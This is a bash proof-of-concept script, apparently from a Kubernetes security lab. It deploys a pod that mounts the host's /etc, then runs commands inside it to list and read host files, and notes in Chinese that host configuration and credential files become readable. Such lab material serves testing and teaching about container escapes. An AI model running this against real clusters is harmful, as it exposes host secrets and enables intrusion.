#!/usr/bin/env bash
set -Eeuo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MANIFEST="$POC_DIR/scene.yaml"
NAMESPACE="${NAMESPACE:-metarget}"
POD_NAME="mount-host-etc"
HELPER="$POC_DIR/../../scripts/probes/k8s_exec_probe.sh"

if [[ "${1:-}" == "--cleanup" ]]; then
  kubectl delete -f "$MANIFEST" --ignore-not-found
  echo "[+] Cleaned resources from $MANIFEST"
  exit 0
fi

command -v kubectl >/dev/null 2>&1 || { echo "[-] Missing dependency: kubectl"; exit 1; }
[[ -x "$HELPER" ]] || { echo "[-] Missing helper: $HELPER"; exit 1; }

if ! kubectl cluster-info >/dev/null 2>&1; then
  echo "[-] Kubernetes API unreachable."
  echo "[*] Hint: run scripts/env_labctl.sh profile k8s-kind"
  echo "[*] Verdict: BLOCKED_STAGE=k8s_api_unreachable"
  exit 1
fi

kubectl get ns "$NAMESPACE" >/dev/null 2>&1 || kubectl create ns "$NAMESPACE" >/dev/null
kubectl apply -f "$MANIFEST"

if ! kubectl wait --for=condition=Ready "pod/$POD_NAME" -n "$NAMESPACE" --timeout=120s; then
  kubectl describe pod "$POD_NAME" -n "$NAMESPACE" || true
  echo "[*] Verdict: BLOCKED_STAGE=k8s_pod_not_ready"
  exit 1
fi

"$HELPER" "$NAMESPACE" "$POD_NAME" 'id; ls /host-etc | head; cat /host-etc/hostname || true'

echo "[*] 可直接读取宿主机配置、凭据类文件（按权限限制）。"
